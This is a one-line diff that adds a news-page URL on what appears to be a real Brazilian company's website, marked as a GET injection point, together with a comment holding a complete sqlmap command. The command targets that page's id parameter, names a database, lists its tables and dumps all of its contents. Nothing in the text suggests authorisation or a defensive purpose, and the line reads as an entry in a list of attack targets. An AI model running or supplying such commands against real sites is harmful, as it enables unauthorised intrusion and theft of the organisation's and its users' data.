@@ -1,0 +1,1 @@
+http://www.alcancyassessoria.com.br/noticias.php?id=23 (GET)  # sqlmap.py -u http://www.alcancyassessoria.com.br/noticias.php?id=23 -D alcancy-noticias --tables --dump-all --threads 5 -v3
